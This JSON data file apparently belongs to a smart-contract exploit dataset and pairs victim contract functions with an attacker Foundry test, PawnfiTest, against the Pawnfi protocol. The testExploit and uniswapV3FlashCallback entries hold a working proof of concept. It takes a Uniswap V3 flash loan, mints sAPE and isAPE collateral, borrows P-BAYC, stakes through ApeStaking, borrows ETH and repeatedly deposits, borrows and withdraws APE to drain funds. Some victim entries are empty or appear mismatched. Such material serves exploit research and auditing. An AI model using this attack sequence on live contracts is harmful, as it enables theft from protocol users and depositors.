[
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "allowance",
    "original_code": "    function allowance(address owner, address spender) override external view returns (uint) {\n        bytes memory data = delegateToViewImplementation(abi.encodeWithSignature(\"allowance(address,address)\", owner, spender));\n        return abi.decode(data, (uint));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "approve",
    "original_code": "    function approve(address to, uint256 tokenId) public virtual override {\n        address owner = ERC721.ownerOf(tokenId);\n        require(to != owner, \"ERC721: approval to current owner\");\n\n        require(\n            _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n            \"ERC721: approve caller is not token owner nor approved for all\"\n        );\n\n        _approve(to, tokenId);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "balanceOf",
    "original_code": "    function balanceOf(address owner) public view virtual override returns (uint256) {\n        require(owner != address(0), \"ERC721: address zero is not a valid owner\");\n        return _balances[owner];\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "decimals",
    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "deposit",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "name",
    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "owner",
    "original_code": "    function owner() public view virtual returns (address) {\n        return _owner;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "randomTrade",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "symbol",
    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "totalSupply",
    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _allTokens.length;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "transfer",
    "original_code": "    function transfer(address dst, uint amount) override external returns (bool) {\n        bytes memory data = delegateToImplementation(abi.encodeWithSignature(\"transfer(address,uint256)\", dst, amount));\n        return abi.decode(data, (bool));\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "transferFrom",
    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n}\n",
    "description": ""
  },
  {
    "contract/interface": "IPToken",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw() public onlyOwner {\n        uint balance = address(this).balance;\n        msg.sender.transfer(balance);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "onERC721Received",
    "original_code": "    function onERC721Received(\n        address operator,\n        address from,\n        uint256 tokenId,\n        bytes calldata data\n    ) external returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 17_496_619);\n        vm.label(address(UniV3Pool), \"UniV3Pool\");\n        vm.label(address(APE), \"APE\");\n        vm.label(address(sAPE), \"sAPE\");\n        vm.label(address(isAPE), \"isAPE\");\n        vm.label(address(iPBAYC), \"iPBAYC\");\n        vm.label(address(CEther), \"CEther\");\n        vm.label(address(PBAYC), \"PBAYC\");\n        vm.label(address(BAYC), \"BAYC\");\n        vm.label(address(Unitroller), \"Unitroller\");\n        vm.label(address(MultipleSourceOracle), \"MultipleSourceOracle\");\n        vm.label(address(ApeStaking1), \"ApeStaking1\");\n        vm.label(address(ApeStaking2), \"ApeStaking2\");\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        deal(address(this), 0);\n        // I add the following line of code only to make the poc work.\n        // Without it the output from APE.balanceOf(P-BAYC) will be 0 and the error 'ERC20: transfer amount exceeds balance' will occur\n        // In the attack tx APE balance of P-BAYC is as below. This issue occurs also with other attack txs.\n        deal(address(APE), address(PBAYC), 206_227_682_165_404_022_135_955);\n\n        emit log_named_decimal_uint(\"Attacker ETH balance before attack\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"Attacker APE balance before attack\", APE.balanceOf(address(this)), APE.decimals());\n        emit log_named_decimal_uint(\n            \"Attacker isAPE balance before attack\", isAPE.balanceOf(address(this)), isAPE.decimals()\n        );\n\n        UniV3Pool.flash(address(this), 200_000 * 1e18, 0, new bytes(1));\n\n        emit log_named_decimal_uint(\"Attacker ETH balance after attack\", address(this).balance, 18);\n        emit log_named_decimal_uint(\"Attacker APE balance after attack\", APE.balanceOf(address(this)), APE.decimals());\n        emit log_named_decimal_uint(\n            \"Attacker isAPE balance after attack\", isAPE.balanceOf(address(this)), isAPE.decimals()\n        );\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "PawnfiTest",
    "source_type": "attacker_contract",
    "function_name": "uniswapV3FlashCallback",
    "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        APE.approve(address(sAPE), APE.balanceOf(address(this)));\n        sAPE.mint(APE.balanceOf(address(this)));\n        sAPE.approve(address(isAPE), sAPE.balanceOf(address(this)));\n        isAPE.mint(sAPE.balanceOf(address(this)));\n\n        address[] memory cTokens = new address[](1);\n        cTokens[0] = address(isAPE);\n        Unitroller.enterMarkets(cTokens);\n\n        iPBAYC.borrow(1005 * 1e18);\n        // emit log_uint(PBAYC.balanceOf(address(this)));\n        PBAYC.approve(address(PBAYC), PBAYC.balanceOf(address(this)));\n        uint256[] memory nftIds = PBAYC.randomTrade(1);\n\n        BAYC.setApprovalForAll(address(ApeStaking1), true);\n        ApeStaking1.setCollectRate(1e18);\n\n        uint256[] memory _mainTokenIds = new uint256[](1);\n        _mainTokenIds[0] = nftIds[0];\n        uint256[] memory _bakcTokenIds;\n        ApeStakingStorage.DepositInfo memory depositInfo =\n            ApeStakingStorage.DepositInfo({mainTokenIds: _mainTokenIds, bakcTokenIds: _bakcTokenIds});\n        ApeStakingStorage.StakingInfo memory stakingInfo =\n            ApeStakingStorage.StakingInfo({nftAsset: address(BAYC), cashAmount: 0, borrowAmount: 0});\n        IApeCoinStaking.SingleNft[] memory _nfts;\n        IApeCoinStaking.PairNftDepositWithAmount[] memory _nftPairs;\n        ApeStaking1.depositAndBorrowApeAndStake(depositInfo, stakingInfo, _nfts, _nftPairs);\n\n        borrowEth();\n\n        for (uint256 i; i < 20; ++i) {\n            (, uint16 lastRewardsRangeIndex,,) = ApeStaking2.pools(1);\n            IApeCoinStaking.TimeRange memory timeRange = ApeStaking2.getTimeRangeBy(1, lastRewardsRangeIndex);\n\n            depositBorrowWithdrawApe(timeRange.capPerPosition);\n        }\n        depositBorrowWithdrawApe(APE.balanceOf(address(PBAYC)));\n        APE.transfer(address(UniV3Pool), 200_000 * 1e18 + fee0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "IApeStaking",
    "source_type": "victim_contract",
    "function_name": "depositAndBorrowApeAndStake",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IApeStaking",
    "source_type": "victim_contract",
    "function_name": "getTimeRangeBy",
    "original_code": "    function getTimeRangeBy(uint256 _poolId, uint256 _index) public view returns (TimeRange memory) {\n        return pools[_poolId].timeRanges[_index];\n    }\n\n    // Pool Methods\n\n",
    "description": ""
  },
  {
    "contract/interface": "IApeStaking",
    "source_type": "victim_contract",
    "function_name": "pools",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IApeStaking",
    "source_type": "victim_contract",
    "function_name": "setCollectRate",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IApeStaking",
    "source_type": "victim_contract",
    "function_name": "withdrawApeCoin",
    "original_code": "    function withdrawApeCoin(uint256 _amount, address _recipient) public {\n        updatePool(APECOIN_POOL_ID);\n\n        Position storage position = addressPosition[msg.sender];\n        if (_amount == position.stakedAmount) {\n            uint256 rewardsToBeClaimed = _claim(APECOIN_POOL_ID, position, _recipient);\n            emit ClaimRewards(msg.sender, rewardsToBeClaimed, _recipient);\n        }\n        _withdraw(APECOIN_POOL_ID, position, _amount);\n\n        apeCoin.transfer(_recipient, _amount);\n\n        emit Withdraw(msg.sender, _amount, _recipient);\n    }\n\n",
    "description": ""
  }
]